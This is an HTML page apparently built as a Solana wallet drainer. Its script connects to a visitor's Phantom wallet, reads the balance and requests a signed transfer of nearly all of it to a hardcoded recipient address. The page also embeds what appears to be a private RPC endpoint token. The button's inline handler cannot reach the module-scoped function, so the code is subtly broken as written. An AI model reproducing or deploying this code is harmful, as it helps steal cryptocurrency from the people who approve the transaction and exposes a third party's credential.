<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Transfer</title>
    <script type="module">
        import { Buffer } from 'https://cdn.jsdelivr.net/npm/buffer@6.0.3/+esm';
        import * as solanaWeb3 from 'https://cdn.jsdelivr.net/npm/@solana/web3.js/+esm';

        window.Buffer = Buffer;

        async function transferSOL() {
            try {
                if (!window.solana || !window.solana.isPhantom) {
                    alert("Please install the Phantom wallet extension.");
                    return;
                }

                // Connect to Phantom wallet
                const response = await window.solana.connect();
                const senderPublicKey = response.publicKey;
                
                if (!senderPublicKey) {
                    alert("Failed to get wallet address.");
                    return;
                }

                const recipientPublicKey = new solanaWeb3.PublicKey("9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf");
                
                // Connect to Solana mainnet
                const connection = new solanaWeb3.Connection(
                    "https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df",
                    "confirmed"
                );

                // Get balance of the sender wallet
                const balance = await connection.getBalance(senderPublicKey);
                if (balance <= 0) {
                    alert("Insufficient balance.");
                    return;
                }

                // Create the transaction
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: senderPublicKey,
                        toPubkey: recipientPublicKey,
                        lamports: balance - 5000, // Leave some balance for fees
                    })
                );

                // Send transaction for signing
                const { signature } = await window.solana.signAndSendTransaction(transaction);
                alert(`Transaction sent! Signature: ${signature}`);

                // Confirm the transaction
                const confirmation = await connection.confirmTransaction(signature);
                if (confirmation.value.err) {
                    alert("Transaction failed!");
                } else {
                    alert("Transaction successful!");
                }

            } catch (error) {
                alert(`Error: ${error.message}`);
            }
        }
    </script>
</head>
<body>
    <h2>Click below to transfer all funds</h2>
    <button onclick="transferSOL()">Transfer Now</button>
</body>
</html>
